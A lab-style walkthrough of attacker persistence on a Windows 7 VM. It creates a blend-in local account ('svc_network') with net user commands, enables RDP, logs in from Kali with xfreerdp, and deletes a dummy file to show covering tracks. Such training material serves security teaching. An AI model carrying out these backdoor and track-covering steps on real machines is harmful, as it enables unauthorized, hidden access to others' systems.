# Persist On A Windows Machine With A Malicious User Account
Creating a malicious local account is a simple way to install a backdoor, often going unnoticed in poorly managed networks. Even if detected, it may remain due to concerns over breaking functionality. Skilled attackers may avoid giving the account admin rights, opting instead to plant a privilege escalation vulnerability for future use

## Tasks
- Create a user with an inconspicuous name that would seamlessly blend into an organization in a VM
- Initiate an RDP connection to the target system from a separate machine, utilizing the malicious account's credentials to showcase successful access
- Navigate the system's directories to emphasize the subtle nature of the malicious account's presence and the potential challenges in detection
- Generate a dummy file in a sensitive directory to simulate a security breach, demonstrating how a malicious actor might misuse this access for unauthorized file manipulation
- Show how the malicious account can be used to cover tracks, such as deleting the dummy file

## Solutions With Scripts
1. Open Command Prompt as Administrator in Windows 7 VM
2. Add a user with a non-suspicious name such as `svc_network` or `backup_admin`
   ```
   net user svc_network password123 /add
   ```
3. Add the user to a specific group like "Users". Avoid giving it administrative privileges to make the account less suspicious
   ```
   net localgroup Users svc_network add
   ```
4. To enable RDP (Remote Desktop Protocol) on Windows 7 VM, go to Control Panel > System and Security > System. Click on Remote Settings from the left panel. Under the Remote Desktop section, select Allow connections from computers running any version of Remote Desktop
5. Allow RDP through Windows Firewall and ensure that Remote Desktop is checked for both private and public networks
6. To initiate an RDP connection from Kali Linux, install `xfreerdp` using the following commands
   ```
   sudo apt update
   sudo apt install freerdp2-x11
   ```
7. Use the malicious account credentials (`svc_network`) to connect to Windows 7 VM via RDP
   ```
   xfreerdp /u:svc_network /p:password123 /v:<Target_VM_IP_address>
   ```
8. To simulate a security breach, create a dummy file in a sensitive directory like C:\Program Files or C:\Windows\Temp. Run the following command
   ```
   echo "Sensitive data" > C:\Windows\Temp\dummymaliciousfile.txt
   ```
9. To cover up the tracks, delete the dummy file
   ```
   del C:\Windows\Temp\dummymaliciousfile.txt
   ```
10. Close the RDP connection by logging out of the RDP session from Kali Linux by pressing Ctrl+C to end the xfreerdp session
